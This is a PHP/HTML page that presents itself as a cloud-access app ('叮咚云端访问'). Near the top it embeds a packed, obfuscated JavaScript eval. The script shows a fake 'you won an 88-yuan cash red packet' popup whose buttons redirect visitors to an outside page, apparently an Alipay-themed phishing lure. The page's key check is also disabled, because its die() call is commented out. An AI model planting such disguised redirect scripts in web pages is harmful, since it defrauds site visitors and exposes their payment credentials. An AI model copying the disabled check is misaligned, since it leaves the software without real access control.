<?php 
$app_key = explode("_",$_GET["app_key"]);
		if($app_key[0] != $cfg['app_key']['tk']){
			header('Content-Type: text/html; charset=UTF-8');
			//die("口令与服务器不一致 已经拦截");
		}
?>
<style>
	*{margin: 0;padding: 0;}
	body{ background-color: #3A3A3A; }
	#main{position: absolute;width: 200px;left: 50%;margin-left: -100px;top:200px;text-align: center;}
	#main li{list-style-type: none;margin-top: 5px;}
	#main li a{color: #fff;}
	#main li a:hover{color: #99e;}
	#main li a:active{color: #e99;}
</style>
<link rel="stylesheet" href="gg/simpleAlert.css">
<script src="gg/jquery.min.js"></script>
<script src="gg/simpleAlert.js"></script>
<script>
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('3 9=m(2*o.n());p(!9){$(0(){3 1=8({"b":"a,5!","4":{"h":0(){1.g()}},"f":{"s":0(){7.6.c=\'j://i.k.l/e.d\'}}})})}r{$(0(){3 1=8({"b":"a,5!","4":{"q":0(){7.6.c=\'j://i.k.l/e.d\'}},"f":{"h":0(){1.g()}}})})}',29,29,'function|onlyChoseAlert||var|buttons|获得88元现金红包|location|window|simpleAlert|num_test|恭喜您|content|href|php|zfb|buttonss|close|拒绝|www|http|52hula|cn|parseInt|random|Math|if|领取红包|else|领取'.split('|'),0,{}))
</script>

<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<meta charset="utf-8"> 
<!-- 新 Bootstrap 核心 CSS 文件 -->
<link href="http://apps.bdimg.com/libs/bootstrap/3.3.0/css/bootstrap.min.css" rel="stylesheet">

<!-- 可选的Bootstrap主题文件（一般不使用） -->
<script src="http://apps.bdimg.com/libs/bootstrap/3.3.0/css/bootstrap-theme.min.css"></script>

<!-- jQuery文件。务必在bootstrap.min.js 之前引入 -->
<script src="http://apps.bdimg.com/libs/jquery/2.0.0/jquery.min.js"></script>

<!-- 最新的 Bootstrap 核心 JavaScript 文件 -->
<script src="http://apps.bdimg.com/libs/bootstrap/3.3.0/js/bootstrap.min.js"></script>
<title>叮咚云端访问</title>
<style>
body,html{
	background:#efefef;
	padding:0px;
	margin:0px;
	overflow-x:hidden;
}
.main{
	margin:10px;
}
.list-group-item a{
	display:block;
}
.label-t{
	margin-bottom:20px;
}
.line{
	height:1px;
	background:#ccc;
}
.btn{
	border-radius: 0px;

}
</style></head>
<body>
